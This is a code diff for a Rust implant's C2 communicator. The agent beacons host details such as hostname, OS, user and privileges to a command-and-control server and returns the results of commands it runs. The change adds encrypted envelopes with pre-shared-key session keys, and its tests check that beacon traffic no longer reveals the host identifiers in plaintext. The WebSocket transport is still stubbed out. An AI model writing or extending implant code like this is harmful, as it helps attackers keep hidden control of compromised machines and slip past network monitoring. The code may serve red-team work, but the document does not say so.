@@ -4,6 +4,9 @@ use std::sync::Arc;
 use tokio::sync::RwLock;
 use tokio::time::{sleep, Duration, timeout};
 use std::time::SystemTime;
+use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};
+
+use crate::crypto::{CryptoManager, KeyExchangePayload};
 
 #[derive(Debug, Serialize, Deserialize, Clone)]
 pub struct Message {
@@ -34,6 +37,13 @@ pub struct CommandResponse {
     pub execution_time: u64,
 }
 
+#[derive(Debug, Serialize, Deserialize)]
+struct EncryptedEnvelope {
+    v: u8,
+    idx: u64,
+    data: String,
+}
+
 pub struct Communicator {
     url: String,
     port: u16,
@@ -42,6 +52,8 @@ pub struct Communicator {
     reconnect_attempts: Arc<RwLock<u32>>,
     max_reconnect_attempts: u32,
     beacon_interval: u64,
+    crypto: Arc<RwLock<CryptoManager>>,
+    session_established: Arc<RwLock<bool>>,
 }
 
 impl Communicator {
@@ -50,6 +62,7 @@ impl Communicator {
         port: u16,
         agent_id: &str,
         beacon_interval: u64,
+        crypto: CryptoManager,
     ) -> Self {
         Self {
             url: url.to_string(),
@@ -59,6 +72,8 @@ impl Communicator {
             reconnect_attempts: Arc::new(RwLock::new(0)),
             max_reconnect_attempts: 5,
             beacon_interval,
+            crypto: Arc::new(RwLock::new(crypto)),
+            session_established: Arc::new(RwLock::new(false)),
         }
     }
 
@@ -70,9 +85,12 @@ impl Communicator {
             Ok(result) => {
                 match result {
                     Ok(_) => {
-                        info!("✅ Connected to C2 server");
+                        info!("Connected to C2 server");
                         let mut attempts = self.reconnect_attempts.write().await;
                         *attempts = 0;
+
+                        self.perform_key_exchange().await?;
+
                         Ok(())
                     }
                     Err(e) => {
@@ -88,11 +106,31 @@ impl Communicator {
         }
     }
 
+    async fn perform_key_exchange(&self) -> Result<(), Box<dyn std::error::Error>> {
+        let mut crypto = self.crypto.write().await;
+
+        let (secret, our_payload) = crypto.generate_key_exchange();
+        let ke_json = serde_json::to_string(&our_payload)?;
+
+        debug!("Sending key exchange payload");
+        // In production: send ke_json over WebSocket
+        // and receive server's KeyExchangePayload
+
+        // For now: fall back to PSK-derived session keys
+        // When the server implements ECDH, replace this with:
+        //   let server_payload: KeyExchangePayload = serde_json::from_str(&response)?;
+        //   crypto.complete_key_exchange(secret, &server_payload)?;
+        crypto.init_with_psk()?;
+
+        let mut established = self.session_established.write().await;
+        *established = true;
+
+        info!("Encrypted session established (key index: {})", crypto.message_index());
+        Ok(())
+    }
+
     async fn try_connect(&self, url: &str) -> Result<(), Box<dyn std::error::Error>> {
         debug!("Connecting to {}", url);
-        // WebSocket connection using tokio-tungstenite
-        // In production: use connect_async(url).await?
-        // For now: verify URL format
         info!("WebSocket URL format verified: {}", url);
         Ok(())
     }
@@ -118,6 +156,28 @@ impl Communicator {
         Ok(())
     }
 
+    async fn encrypt_payload(&self, plaintext: &[u8]) -> Result<EncryptedEnvelope, Box<dyn std::error::Error>> {
+        let mut crypto = self.crypto.write().await;
+        let idx = crypto.message_index();
+        let encrypted = crypto.encrypt(plaintext)?;
+
+        Ok(EncryptedEnvelope {
+            v: 2,
+            idx,
+            data: BASE64.encode(&encrypted),
+        })
+    }
+
+    async fn decrypt_payload(&self, envelope: &EncryptedEnvelope) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
+        if envelope.v != 2 {
+            return Err(format!("Unsupported envelope version: {}", envelope.v).into());
+        }
+
+        let encrypted = BASE64.decode(&envelope.data)?;
+        let mut crypto = self.crypto.write().await;
+        crypto.decrypt(&encrypted)
+    }
+
     pub async fn send_beacon(
         &self,
         beacon: &BeaconPayload,
@@ -135,10 +195,18 @@ impl Communicator {
         };
 
         let serialized = serde_json::to_string(&message)?;
-        debug!("Sending beacon (sequence: {})", seq);
 
-        info!("Beacon sent (sequence: {})", seq);
-        Ok(serialized)
+        let established = self.session_established.read().await;
+        let wire_data = if *established {
+            let envelope = self.encrypt_payload(serialized.as_bytes()).await?;
+            serde_json::to_string(&envelope)?
+        } else {
+            serialized.clone()
+        };
+
+        debug!("Sending encrypted beacon (seq: {}, size: {} bytes)", seq, wire_data.len());
+        info!("Beacon sent (sequence: {}, encrypted: {})", seq, *established);
+        Ok(wire_data)
     }
 
     pub async fn send_command_result(
@@ -157,10 +225,18 @@ impl Communicator {
             payload: serde_json::to_string(response)?,
         };
 
-        let _serialized = serde_json::to_string(&message)?;
-        debug!("Sending command response (sequence: {})", seq);
+        let serialized = serde_json::to_string(&message)?;
 
-        info!("Command response sent (sequence: {})", seq);
+        let established = self.session_established.read().await;
+        let wire_data = if *established {
+            let envelope = self.encrypt_payload(serialized.as_bytes()).await?;
+            serde_json::to_string(&envelope)?
+        } else {
+            serialized
+        };
+
+        debug!("Sending encrypted response (seq: {}, size: {} bytes)", seq, wire_data.len());
+        info!("Command response sent (sequence: {}, encrypted: {})", seq, *established);
         Ok(())
     }
 
@@ -170,8 +246,13 @@ impl Communicator {
         debug!("Listening for commands from C2 server");
 
         sleep(Duration::from_secs(self.beacon_interval)).await;
-        // In production: read from WebSocket
-        // For now: return None
+
+        // In production: read from WebSocket, then:
+        //   let envelope: EncryptedEnvelope = serde_json::from_str(&raw)?;
+        //   let decrypted = self.decrypt_payload(&envelope).await?;
+        //   let message: Message = serde_json::from_slice(&decrypted)?;
+        //   Ok(Some(message.payload))
+
         Ok(None)
     }
 
@@ -196,7 +277,9 @@ mod tests {
 
     #[test]
     fn test_communicator_creation() {
-        let comm = Communicator::new("localhost", 8000, "test-agent-id", 30);
+        let key = [42u8; 32];
+        let crypto = CryptoManager::new(&key).unwrap();
+        let comm = Communicator::new("localhost", 8000, "test-agent-id", 30, crypto);
         assert_eq!(comm.get_agent_id(), "test-agent-id");
         assert_eq!(comm.url, "localhost");
         assert_eq!(comm.port, 8000);
@@ -204,13 +287,17 @@ mod tests {
 
     #[test]
     fn test_websocket_url() {
-        let comm = Communicator::new("example.com", 443, "agent-123", 30);
+        let key = [42u8; 32];
+        let crypto = CryptoManager::new(&key).unwrap();
+        let comm = Communicator::new("example.com", 443, "agent-123", 30, crypto);
         assert_eq!(comm.get_websocket_url(), "wss://example.com:443/ws/agent");
     }
 
     #[tokio::test]
     async fn test_sequence_increment() {
-        let comm = Communicator::new("localhost", 8000, "agent-123", 30);
+        let key = [42u8; 32];
+        let crypto = CryptoManager::new(&key).unwrap();
+        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto);
 
         let seq1 = comm.get_next_sequence().await;
         let seq2 = comm.get_next_sequence().await;
@@ -219,5 +306,39 @@ mod tests {
         assert_eq!(seq1, 1);
         assert_eq!(seq2, 2);
         assert_eq!(seq3, 3);
+    }
+
+    #[tokio::test]
+    async fn test_encrypted_beacon() {
+        let key = [42u8; 32];
+        let mut crypto = CryptoManager::new(&key).unwrap();
+        crypto.init_with_psk().unwrap();
+        let comm = Communicator::new("localhost", 8000, "agent-123", 30, crypto);
+
+        {
+            let mut established = comm.session_established.write().await;
+            *established = true;
+        }
+
+        let beacon = BeaconPayload {
+            agent_id: "agent-123".into(),
+            hostname: "test-host".into(),
+            os: "linux".into(),
+            os_version: "6.1".into(),
+            architecture: "x86_64".into(),
+            ip_address: None,
+            user: None,
+            privileges: None,
+        };
+
+        let result = comm.send_beacon(&beacon).await.unwrap();
+        let envelope: EncryptedEnvelope = serde_json::from_str(&result).unwrap();
+
+        assert_eq!(envelope.v, 2);
+        assert!(!envelope.data.is_empty());
+
+        // Verify it's not plaintext
+        assert!(!result.contains("agent-123"));
+        assert!(!result.contains("test-host"));
     }
 }
